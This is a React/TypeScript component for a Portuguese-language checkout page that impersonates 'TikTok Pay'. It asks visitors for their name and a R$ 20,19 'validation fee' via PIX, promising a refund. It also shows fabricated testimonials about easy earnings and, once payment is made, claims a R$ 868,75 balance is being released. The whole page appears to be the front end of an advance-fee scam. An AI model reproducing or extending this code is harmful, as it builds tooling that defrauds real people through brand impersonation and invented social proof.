import { motion, AnimatePresence } from 'framer-motion';
import { 
    ShieldCheck, 
    User, 
    Copy, 
    Star,
    Megaphone,
    Smartphone,
    Loader2,
    Check
} from 'lucide-react';
import { useState, useEffect } from 'react';
import axios from 'axios';
import { toast } from 'sonner';

const testimonials = [
    { name: 'Caio Oliveira', rating: 5, comment: '“Lancei minha moto e dei um iPhone pra minha Coroa, o Tiktok acertou de mais nesse evento', img: '/reviews/1756588828370-photo_2025-08-30_18-12-16.webp' },
    { name: 'Lucas Santos', rating: 5, comment: '“Eu e minha família estamos fazendo muito dindin todo dia mdsss kkkk amooooo', img: '/reviews/1756591742828-photo_2025-08-30_18-12-16.webp' },
    { name: 'Ana Costa', rating: 5, comment: '“Estava com medo mas funcionou certinho!', img: '/reviews/1756588864250-photo_2025-08-30_18-12-28.webp' },
    { name: 'Larissa Lima', rating: 5, comment: '“TikTok Pay é real, já fiz meu primeiro saque.', img: '/reviews/1756588901009-photo_2025-08-30_18-12-20.webp' },
];

interface CheckoutViewProps {
    taxValue?: string;
}

export const CheckoutView = ({ taxValue = '20.19' }: CheckoutViewProps) => {
    const [step, setStep] = useState<'id' | 'pay' | 'success'>('id');
    const [name, setName] = useState('');
    const [copied, setCopied] = useState(false);
    const [loading, setLoading] = useState(false);
    const [activeTestimonial, setActiveTestimonial] = useState(0);
    
    const [qrCode, setQrCode] = useState('');
    const [qrCodeBase64, setQrCodeBase64] = useState('');
    const [reference, setReference] = useState('');

    // Rotação automática dos depoimentos
    useEffect(() => {
        const interval = setInterval(() => {
            setActiveTestimonial((prev) => (prev + 1) % testimonials.length);
        }, 4000);
        return () => clearInterval(interval);
    }, []);

    const handleCreatePayment = async () => {
        if (name.length <= 3) return;
        
        setLoading(true);
        try {
            const response = await axios.post('/payment/create', { name });
            if (response.data.status === 'success') {
                setQrCode(response.data.qr_code);
                setQrCodeBase64(response.data.qr_code_base64);
                setReference(response.data.reference);
                setStep('pay');
            }
        } catch (error) {
            console.error('Erro ao gerar pagamento:', error);
            toast.error('Falha ao gerar o PIX. Tente novamente em alguns segundos.');
        } finally {
            setLoading(false);
        }
    };

    const handleCopyPix = () => {
        navigator.clipboard.writeText(qrCode);
        setCopied(true);
        setTimeout(() => setCopied(false), 2000);
    };

    useEffect(() => {
        let interval: NodeJS.Timeout;
        if (step === 'pay' && reference) {
            interval = setInterval(async () => {
                try {
                    const response = await axios.get(`/payment/status/${reference}`);
                    if (response.data.status === 'approved') {
                        if (typeof window !== 'undefined' && (window as any).ttq) {
                            (window as any).ttq.track('Purchase', {
                                value: parseFloat(taxValue),
                                currency: 'BRL',
                                content_type: 'product',
                                content_name: 'Taxa de Validação'
                            });
                        }
                        
                        setStep('success');
                        clearInterval(interval);
                    }
                } catch (error) {
                    console.error('Erro ao verificar status:', error);
                }
            }, 3000);
        }
        return () => { if (interval) clearInterval(interval); };
    }, [step, reference]);

    const formattedTax = taxValue.replace('.', ',');

    return (
        <div className="min-h-screen bg-[#eff6ff] flex flex-col items-center pb-10">
            <div className="w-full bg-[#ff0050] py-3 text-center shadow-md">
                <span className="text-white font-black text-xs tracking-[0.2em] flex items-center justify-center gap-2">
                    <ShieldCheck className="w-4 h-4" />
                    PAGAMENTO 100% SEGURO
                </span>
            </div>

            <div className="w-full max-w-[450px] bg-white border-b border-border/40 p-4 flex items-center gap-3">
                <div className="bg-[#ff0050]/10 p-2 rounded-full">
                    <Megaphone className="w-5 h-5 text-[#ff0050]" />
                </div>
                <span className="text-[11px] font-bold text-[#ff0050] leading-tight uppercase">
                    Seu feedback sobre o TikTok Pay vale dinheiro!
                </span>
            </div>

            <main className="w-full max-w-[450px] px-4 mt-4 space-y-4">
                {step !== 'success' && (
                    <div className="bg-white rounded-2xl p-4 shadow-sm border border-border/20 flex items-center gap-4">
                        <div className="w-14 h-14 bg-black rounded-2xl flex items-center justify-center overflow-hidden shrink-0">
                            <img 
                                src="https://upload.wikimedia.org/wikipedia/en/a/a9/TikTok_logo.svg" 
                                alt="TikTok" 
                                className="w-8 h-8 invert"
                            />
                        </div>
                        <div className="flex-1">
                            <h3 className="text-sm font-black leading-tight text-foreground/80">
                                Taxa de Validação - Estorno após Pagamento.
                            </h3>
                            <div className="mt-1 flex items-baseline gap-1">
                                <span className="text-[10px] font-bold text-muted-foreground uppercase">Por apenas</span>
                                <span className="text-lg font-black text-[#ff0050]">R$ {formattedTax}</span>
                            </div>
                        </div>
                    </div>
                )}

                <AnimatePresence mode="wait">
                    {step === 'id' && (
                        <motion.div
                            key="id"
                            initial={{ opacity: 0, y: 10 }}
                            animate={{ opacity: 1, y: 0 }}
                            exit={{ opacity: 0, y: -10 }}
                            className="bg-white rounded-2xl p-6 shadow-md border border-border/20"
                        >
                            <div className="flex items-center gap-2 mb-6">
                                <div className="w-8 h-8 bg-muted rounded-full flex items-center justify-center">
                                    <User className="w-4 h-4 text-muted-foreground" />
                                </div>
                                <h2 className="text-base font-black">Identificação</h2>
                            </div>

                            <div className="space-y-4">
                                <div>
                                    <label className="block text-[10px] font-bold text-muted-foreground uppercase mb-1.5 ml-1">
                                        Nome completo
                                    </label>
                                    <input 
                                        type="text" 
                                        placeholder="Nome e sobrenome"
                                        value={name}
                                        onChange={(e) => setName(e.target.value)}
                                        className="w-full bg-[#f3f4f6] border-none rounded-xl py-4 px-5 text-sm font-bold outline-none focus:ring-2 focus:ring-[#ff0050]/20 transition-all"
                                    />
                                </div>

                                <button
                                    onClick={handleCreatePayment}
                                    disabled={name.length <= 3 || loading}
                                    className={`w-full py-4 rounded-xl font-black text-sm tracking-widest transition-all flex items-center justify-center gap-2 ${
                                        name.length > 3 
                                        ? 'bg-[#ff0050] text-white shadow-lg shadow-[#ff0050]/20 active:scale-95' 
                                        : 'bg-muted text-muted-foreground cursor-not-allowed'
                                    }`}
                                >
                                    {loading ? <Loader2 className="w-4 h-4 animate-spin" /> : 'PAGAR AGORA'}
                                </button>
                            </div>
                        </motion.div>
                    )}

                    {step === 'pay' && (
                        <motion.div
                            key="pay"
                            initial={{ opacity: 0, y: 10 }}
                            animate={{ opacity: 1, y: 0 }}
                            className="bg-white rounded-2xl p-6 shadow-md border border-border/20 text-center"
                        >
                            <h2 className="text-base font-black mb-2">Escaneie o QR-code ou copie o código</h2>
                            <p className="text-xs text-muted-foreground mb-6">Você tem 30 minutos para concluir o pagamento.</p>

                            <div className="mx-auto w-48 h-48 bg-white border-4 border-[#f3f4f6] rounded-2xl p-2 mb-6 flex items-center justify-center">
                                {qrCodeBase64 ? (
                                 <img 
    src={`data:image/png;base64,${qrCodeBase64}`} 
    alt="QR Code PIX" 
    className="w-full h-full"
/>
                                ) : (
                                    <div className="animate-pulse bg-muted w-full h-full rounded-lg" />
                                )}
                            </div>

                            <div className="bg-[#f3f4f6] rounded-xl p-4 mb-4">
                                <div className="text-[10px] font-bold text-muted-foreground uppercase mb-1">Valor PIX</div>
                                <div className="text-xl font-black text-foreground tracking-tight">R$ {formattedTax}</div>
                            </div>

                            <div className="space-y-3">
                                <div className="relative">
                                    <input 
                                        readOnly
                                        value={qrCode}
                                        className="w-full bg-[#f3f4f6] rounded-xl py-3.5 px-4 text-[9px] font-mono text-muted-foreground/60 pr-12 border-none outline-none overflow-hidden"
                                    />
                                    <button 
                                        onClick={handleCopyPix}
                                        className="absolute right-2 top-1/2 -translate-y-1/2 p-2 text-[#ff0050] hover:bg-[#ff0050]/5 rounded-lg transition-colors"
                                    >
                                        <Copy className="w-4 h-4" />
                                    </button>
                                </div>

                                <button
                                    onClick={handleCopyPix}
                                    className="w-full py-4 bg-[#ff0050] text-white rounded-xl font-black text-sm tracking-widest shadow-lg shadow-[#ff0050]/20 flex items-center justify-center gap-2 active:scale-95 transition-all"
                                >
                                    {copied ? 'CÓDIGO COPIADO!' : 'COPIAR CÓDIGO PIX'}
                                </button>
                            </div>

                            <div className="mt-6 flex items-center justify-center gap-2 text-[#ff0050] font-bold text-xs animate-pulse">
                                <Loader2 className="w-3 h-3 animate-spin" />
                                AGUARDANDO PAGAMENTO...
                            </div>
                        </motion.div>
                    )}

                    {step === 'success' && (
                        <motion.div
                            key="success"
                            initial={{ opacity: 0, scale: 0.9 }}
                            animate={{ opacity: 1, scale: 1 }}
                            className="bg-white rounded-3xl p-10 shadow-2xl border border-green-100 text-center"
                        >
                            <div className="w-20 h-20 bg-green-500 rounded-full flex items-center justify-center mx-auto mb-6 shadow-lg shadow-green-200">
                                <Check className="w-10 h-10 text-white" />
                            </div>
                            <h2 className="text-2xl font-black mb-2 text-green-600 tracking-tight">Pagamento Aprovado!</h2>
                            <p className="text-sm text-muted-foreground leading-relaxed">
                                Sua taxa foi validada. Seu saldo de R$ 868,75 está sendo liberado para o PIX informado.
                            </p>
                        </motion.div>
                    )}
                </AnimatePresence>

                {step !== 'success' && (
                    <div className="relative h-[160px] w-full overflow-hidden">
                        <AnimatePresence mode="wait">
                            <motion.div
                                key={activeTestimonial}
                                initial={{ opacity: 0, x: 20 }}
                                animate={{ opacity: 1, x: 0 }}
                                exit={{ opacity: 0, x: -20 }}
                                transition={{ duration: 0.5, ease: 'easeInOut' }}
                                className="absolute inset-0"
                            >
                                <div className="bg-white rounded-2xl p-6 shadow-lg border border-border/10 flex flex-col gap-4">
                                    <div className="flex items-center gap-4">
                                        <img 
                                            src={testimonials[activeTestimonial].img} 
                                            className="w-12 h-12 rounded-full border-2 border-primary/10 object-cover" 
                                            alt={testimonials[activeTestimonial].name} 
                                        />
                                        <div>
                                            <div className="text-base font-black leading-none text-foreground/90">
                                                {testimonials[activeTestimonial].name}
                                            </div>
                                            <div className="flex mt-1.5">
                                                {[...Array(testimonials[activeTestimonial].rating)].map((_, i) => (
                                                    <Star key={i} className="w-3.5 h-3.5 fill-yellow-400 text-yellow-400" />
                                                ))}
                                            </div>
                                        </div>
                                    </div>
                                    <p className="text-sm text-muted-foreground font-medium italic leading-relaxed">
                                        {testimonials[activeTestimonial].comment}
                                    </p>
                                </div>
                            </motion.div>
                        </AnimatePresence>
                        
                        <div className="absolute bottom-2 left-1/2 -translate-x-1/2 flex gap-1.5 z-10">
                            {testimonials.map((_, i) => (
                                <div 
                                    key={i} 
                                    className={`h-1.5 rounded-full transition-all duration-500 ${
                                        i === activeTestimonial ? 'w-6 bg-[#ff0050]' : 'w-1.5 bg-[#ff0050]/20'
                                    }`} 
                                />
                            ))}
                        </div>
                    </div>
                )}
            </main>
        </div>
    );
};
